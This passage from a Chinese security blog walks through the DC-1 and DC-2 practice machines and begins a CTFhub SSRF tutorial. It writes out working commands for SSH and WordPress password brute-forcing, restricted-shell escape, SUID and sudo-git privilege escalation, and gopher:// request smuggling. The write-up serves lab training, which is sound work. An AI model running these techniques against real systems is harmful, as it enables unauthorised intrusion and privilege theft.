<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A321.png"></p>
<p>发现了flag4这个用户，但是我们并没有他的密码，所以尝试一下暴力破解</p>
<p>相关知识的两篇文章：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/li528405176/article/details/82810342?ops_request_misc=%7B%22request_id%22:%22165642658616782388078059%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=165642658616782388078059&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-82810342-null-null.142%5Ev24%5Econtrol,157%5Ev15%5Enew_3&utm_term=SSH&spm=1018.2226.3001.4187">(6条消息) SSH简介及两种远程登录的方法_ssh @_Jack LDZ的博客-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/397779150">黑客工具之hydra详细使用教程 - 知乎 (zhihu.com)</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l flag4 -P /usr/share/wordlists/rockyou.txt.gz ssh://192.168.10.135 </span><br></pre></td></tr></table></figure>

<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A322.png"></p>
<p>我们之前使用nmap扫端口时也发现22端口开放了ssh，这里也爆破出flag4用户的密码是orange，然后我们用kali进行连接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh flag4@192.168.10.135</span><br></pre></td></tr></table></figure>

<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A323.png"></p>
<p>发现好像也没啥</p>
<h3 id="flag5——suid提权"><a href="#flag5——suid提权" class="headerlink" title="flag5——suid提权"></a>flag5——suid提权</h3><p>但是上面说到，访问&#x2F;etc&#x2F;shadow需要root权限，这也就意味着需要提权</p>
<p>关于suid提权：</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/272617.html">简谈SUID提权 - FreeBuf网络安全行业门户</a></p>
<p>利用find命令来查找具有SUID权限的文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A324.png"></p>
<p>find比较常用，可以执行root权限的命令找查文件，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name index.php -exec &quot;/bin/sh&quot; \;</span><br></pre></td></tr></table></figure>

<p>找查什么文件不重要（但是是存在的文件），只需要格式对，然后后面加上 -exec “&#x2F;bin&#x2F;sh” ;</p>
<p>关于&#x2F;bin&#x2F;sh的介绍：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/fengliu-/p/9999854.html">#!&#x2F;bin&#x2F;sh简介 - feng..liu - 博客园 (cnblogs.com)</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line"> </span><br><span class="line">ls</span><br><span class="line"> </span><br><span class="line">cat thefinalflag.txt</span><br></pre></td></tr></table></figure>

<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-1%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A325.png"></p>
<p>终于拿到最后一个flag了，与君共勉。</p>
<p>以上内容参考大神文章：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/l2872253606/article/details/125463013">DC-1靶场搭建及渗透实战详细过程</a></p>
<h2 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h2><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>首先用nmap扫描一下，因为是NAT模式，所以可以直接搜一定范围内的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.10.0/24</span><br></pre></td></tr></table></figure>

<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A3.png"></p>
<p>我们知道该靶机的mac地址，所以可以很轻松的在扫描出的里面找到IP地址，DC-2靶机地址为192.168.10.136，只有80端口开启了http服务</p>
<p>但是这个命令只是执行了常见端口的扫描，现在使用全面扫描的命令对目标靶机再次进行扫描</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p- 192.168.10.136</span><br></pre></td></tr></table></figure>

<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A32.png"></p>
<p>可以看到除了80端口之外，还有7744开放了ssh服务</p>
<p>尝试访问，发现访问失败，我们要将靶机的IP地址放在host文件夹下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\drivers\etc</span><br></pre></td></tr></table></figure>

<p>将靶机的IP添加到其中</p>
<p>这个文件是干什么的呢，根据Windows系统规定，在进行DNS请求以前，Windows系统会先检查自己的Hosts文件中是否有这个地址映射关系，如果有则调用这个  IP地址映射，如果没有再向已知的DNS服务器提出域名解析。 也就是说Hosts的请求级别比DNS高。  C:Windows&#x2F;System32&#x2F;drivers&#x2F;etc&#x2F;hosts 是<strong>域名解析文件</strong>。</p>
<p>我们一开始是没法改写host文件的，所以要改写权限</p>
<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A34-16898205495855.png"></p>
<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A33.png"></p>
<p>写入之后就可以成功访问了。</p>
<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A35.png"></p>
<h3 id="flag2——cewl配合wpscan的使用"><a href="#flag2——cewl配合wpscan的使用" class="headerlink" title="flag2——cewl配合wpscan的使用"></a>flag2——cewl配合wpscan的使用</h3><p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A36.png"></p>
<p>同时得知该网站页面是由wordpress搭建的。也是一种CMS，所以就用metasploit的search找了一下，发现wordpress都是对于特定版本发生的，并且对DC-2靶机探测，但是靶机并没有对应的漏洞，所以就打消了使用框架漏洞的想法。</p>
<p>页面上就有一个flag，我们直接进行查看，并翻译一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">你的常规字典可能无法爆破成功，因此，也许你需要去cewl一个字典。</span><br><span class="line">尽管密码字典越大越好，但是有时你仍然无法爆破出正确密码</span><br><span class="line">登录去查看下一个flag</span><br><span class="line">如果你无法发现flag，登录另一个</span><br><span class="line">这里提示我们cewl一个密码字典，kali走起</span><br></pre></td></tr></table></figure>

<p>提示了cewl，所以就上网看了看，这是kali自带的密码字典生成工具</p>
<p>既然要用cewl生成字典，那么就要找到登录框，使用dirb挖掘一下目录：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://dc-2</span><br></pre></td></tr></table></figure>

<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A39.png"></p>
<p>尝试对于+号开头的进行访问，很快就找到了登陆界面：</p>
<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A310.png"></p>
<p>同时由于wordpress这种热门的搭建博客的CMS，在这里也就知道了一个新工具，wpscan（一种专门针对于wordpress的扫描工具），这里就简单说一下其参数：</p>
<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A37.png"></p>
<p>接下来用wpscan枚举一下用户名：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2/ -e u      //枚举用户名字</span><br></pre></td></tr></table></figure>

<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A38.png"></p>
<p>扫描出的三个用户：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">jerry</span><br><span class="line">tom</span><br></pre></td></tr></table></figure>

<p>知道用户名，并结合flag1的提示，我们使用cewl进行密码字典的生成</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://dc-2 -w passwd.txt</span><br></pre></td></tr></table></figure>

<p>在对应目录下就生成了密码字典</p>
<p>接下来将用户名输出到一个文件里，方便我们使用wpscan进行爆破</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;admin&quot; &gt; user.txt</span><br><span class="line">echo &quot;jerry&quot; &gt;&gt; user.txt</span><br><span class="line">echo &quot;tom&quot; &gt;&gt; user.txt</span><br></pre></td></tr></table></figure>

<p>再使用wpscan进行爆破：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2/ -U user.txt -P passwd.txt</span><br></pre></td></tr></table></figure>

<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A311.png"></p>
<p>可以看到爆破出了两个用户名和其对应的密码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jerry/adipiscing</span><br><span class="line">tom/parturient</span><br></pre></td></tr></table></figure>

<p>尝试登录，注：这里可能在登录成功之后跳转到了一个空白页面，需要我们手动在url里面输入：<a target="_blank" rel="noopener" href="http://dc-2/wp-admin/">http://dc-2/wp-admin/</a></p>
<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A312.png"></p>
<p>在页面里面到处找找就发现了flag2。</p>
<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A313.png"></p>
<p>flag2的内容告诉我们：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wordpress已经没有什么了，让我们尝试其他的方法</span><br></pre></td></tr></table></figure>

<h3 id="flag3-1"><a href="#flag3-1" class="headerlink" title="flag3"></a>flag3</h3><p>框架相关已经没了，另一条路是什么呢，这时我们想起靶机的7744端口还开放了ssh服务，还是尝试之前爆破出来的用户名和密码尝试登录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh jerry@192.168.10.136 -p 7744</span><br></pre></td></tr></table></figure>

<p>输了几次对应密码都不对，就尝试使用tom进行登录：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh tom@192.168.10.136 -p 7744</span><br></pre></td></tr></table></figure>

<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A314.png"></p>
<p>可以看到登录成功，接下来使用ls发现了flag3.txt，再使用cat命令查看文件内容，但是发现命令被禁用了</p>
<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A315.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compgen -c       //查看可以使用的指令</span><br></pre></td></tr></table></figure>

<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A316.png"></p>
<p>发现很多命令都可以，但是我们比较熟知的就是vi，使用vi进行查看：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi flag3.txt</span><br></pre></td></tr></table></figure>

<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A317.png"></p>
<p>拿到flag3的内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</span><br></pre></td></tr></table></figure>

<p>提示我们需要su来切换用户</p>
<h3 id="flag4——vi提权"><a href="#flag4——vi提权" class="headerlink" title="flag4——vi提权"></a>flag4——vi提权</h3><p>除了vi提权，还有一种就是使用自己定义的bash对rbash进行逃逸</p>
<p>这里有一篇rbash讲的很好的文章：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43168364/article/details/111830233?ops_request_misc=%7B%22request_id%22:%22162719543816780366532696%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=162719543816780366532696&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-4-111830233.pc_v2_rank_blog_default&utm_term=-rbash&spm=1018.2226.3001.4450">(6条消息) 【渗透测试】— rbash逃逸方法简述_rbash 命令_通地塔的博客-CSDN博客</a></p>
<p>直接进行切换：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su jerry</span><br></pre></td></tr></table></figure>

<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A318.png"></p>
<p>还是收到了rbash限制，所以就需要进行vi提权（使用vi进入任意文件）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi 123</span><br></pre></td></tr></table></figure>

<p>然后在末行模式下使用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:set shell=/bin/bash</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ..  //退回上级目录</span><br><span class="line">ls</span><br></pre></td></tr></table></figure>

<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A319.png"></p>
<p>发现了jerry目录，进入其中，并ls一下</p>
<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A320.png"></p>
<p>还是使用vi查看一下：</p>
<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A321.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Good to see that you’ve made it this far - but you’re not home yet.You still need to get the final flag (the only flag that really counts!!!).No hints here - you’re on your own now. :-)Go on - git outta here!!!</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Good to see that you&#x27;ve made it this far - but you&#x27;re not home yet.</span><br><span class="line">很高兴看到你走了这么远-但你还没回家。</span><br><span class="line">You still need to get the final flag (the only flag that really counts!!!).</span><br><span class="line">你仍然需要得到最终的标志（唯一真正重要的标志！！！） # 就是root嘛，懂的</span><br><span class="line">No hints here - you&#x27;re on your own now.  :-)</span><br><span class="line">这里没有提示-你现在只能靠自己了。：-）</span><br><span class="line">Go on - git outta here!!!!</span><br><span class="line">去吧，离这里远点 #是用 git 提权吗</span><br></pre></td></tr></table></figure>

<h3 id="flag5——git提权"><a href="#flag5——git提权" class="headerlink" title="flag5——git提权"></a>flag5——git提权</h3><p>所以就要切换到root用户</p>
<p>直接切是切不了的</p>
<p>在这里使用上面文章的方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">export -p        //查看环境变量</span><br><span class="line">BASH_CMDS[a]=/bin/sh;a         //把/bin/sh给a</span><br><span class="line">/bin/bash</span><br><span class="line">export PATH=$PATH:/bin/         //添加环境变量</span><br><span class="line">export PATH=$PATH:/usr/bin      //添加环境变量</span><br><span class="line"></span><br><span class="line">提权成功</span><br></pre></td></tr></table></figure>

<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A322-169009707507011.png"></p>
<p>发现做完这些还是进不去</p>
<p>这时候我们想到了suid，用命令看看有哪些是具有suid的可执行文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A323.png"></p>
<p>我们可以发现sudo是具有suid的权限的，所以就用sudo -l命令来看看有哪些是具有sudo权限的</p>
<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A324.png"></p>
<p>发现有git可以直接切换到root权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd</span><br><span class="line">sudo git help config</span><br><span class="line">!/bin/bash               //在末行模式输入</span><br></pre></td></tr></table></figure>

<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A325.png"></p>
<p>可以看到，成功拿到了root权限，但是我们的目录退到了jerry目录下，再次cd</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd</span><br><span class="line">ls</span><br><span class="line">cat final-flag.txt</span><br></pre></td></tr></table></figure>

<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A326.png"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/18/ctfhub%E7%9A%84ssrf%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.jpg">
      <meta itemprop="name" content="liberator">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="liberator">
      <meta itemprop="description" content="君子坐而论道，少年起而行之">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | liberator">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2023/06/18/ctfhub%E7%9A%84ssrf%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">ctfhub的ssrf部分复现</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2023-06-18 21:35:14" itemprop="dateCreated datePublished" datetime="2023-06-18T21:35:14+08:00">2023-06-18</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-06-30 16:08:25" itemprop="dateModified" datetime="2023-06-30T16:08:25+08:00">2023-06-30</time>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>7.8k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>14 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="CTFhub-ssrf"><a href="#CTFhub-ssrf" class="headerlink" title="CTFhub ssrf"></a>CTFhub ssrf</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>Gopher协议</p>
<p>gopher协议是一个古老且强大的协议，可以理解为是http协议的前身，他可以实现多个数据包整合发送。通过gopher协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。</p>
<p>很多时候在SSRF下，我们无法通过HTTP协议来传递POST数据，这时候就需要用到gopher协议来发起POST请求了。</p>
<p>gopher的协议格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_&lt;TCP数据流&gt;</span><br><span class="line">&lt;port&gt;默认为70</span><br><span class="line">发起多条请求每条要用回车换行去隔开使用%0d%0a隔开，如果多个参数，参数之间的&amp;也需要进行URL编码</span><br></pre></td></tr></table></figure>

<p>但是gopher协议在各个语言中是有使用限制的。</p>
<table>
<thead>
<tr>
<th align="center">语言</th>
<th align="center">支持情况</th>
</tr>
</thead>
<tbody><tr>
<td align="center">PHP</td>
<td align="center">–wite-curlwrappers且php版本至少为5.3</td>
</tr>
<tr>
<td align="center">Java</td>
<td align="center">小于JDK1.7</td>
</tr>
<tr>
<td align="center">Curl</td>
<td align="center">低版本不支持</td>
</tr>
<tr>
<td align="center">Perl</td>
<td align="center">支持</td>
</tr>
<tr>
<td align="center">ASP.NET</td>
<td align="center">小于版本3</td>
</tr>
</tbody></table>
<h3 id="Gopher协议传递GET请求"><a href="#Gopher协议传递GET请求" class="headerlink" title="Gopher协议传递GET请求"></a>Gopher协议传递GET请求</h3><p>gopher在发送请求时候，必须进行URL编码</p>
<p>我本地准备PHP代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>http访问并抓包</p>
<p><img src="/ctfhubssrf/CTFhubssrf%E7%9A%84%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86.png"></p>
<p>get型的http数据包如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /testg.php?name=xxx HTTP/1.1</span><br><span class="line">Host: 10.211.55.2</span><br></pre></td></tr></table></figure>

<p>直接在Burpsuite 中将数据进行编码（比较方便）</p>
<p>编码的时候在最后一定要补%0d%0a代表结束。</p>
<p><img src="/ctfhubssrf/CTFhub%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%862.png"></p>
<p>Burpsuite编码后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%47%45%54%20%2f%74%65%73%74%67%2e%70%68%70%3f%6e%61%6d%65%3d%78%78%78%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%32%31%31%2e%35%35%2e%32</span><br></pre></td></tr></table></figure>

<p>结尾没有%0d%0a我们手动添加一下。</p>
<p>转换为gopher</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl gopher://10.211.55.2:80/_%47%45%54%20%2f%74%65%73%74%67%2e%70%68%70%3f%6e%61%6d%65%3d%78%78%78%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%32%31%31%2e%35%35%2e%32%0d%0a</span><br></pre></td></tr></table></figure>

<h3 id="Gopher协议传递POST请求"><a href="#Gopher协议传递POST请求" class="headerlink" title="Gopher协议传递POST请求"></a>Gopher协议传递POST请求</h3><p>修改本地代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们用gopher协议传递POST请求时，必须要包含这四个，还有一个post传参。</p>
<p><img src="/ctfhubssrf/CTFhubssrf%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%863.png"></p>
<p>转换为gopher</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl gopher://10.211.55.2:80/_%50%4f%53%54%20%2f%74%65%73%74%67%2e%70%68%70%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%32%31%31%2e%35%35%2e%32%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%38%0d%0a%0d%0a%6e%61%6d%65%3d%78%78%78%0d%0a</span><br></pre></td></tr></table></figure>

<h2 id="ctfhub-ssrf的内网访问"><a href="#ctfhub-ssrf的内网访问" class="headerlink" title="ctfhub ssrf的内网访问"></a>ctfhub ssrf的内网访问</h2><p>一进去页面是空白的，不过根据题目提示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">尝试访问位于127.0.0.1的flag.php吧</span><br></pre></td></tr></table></figure>

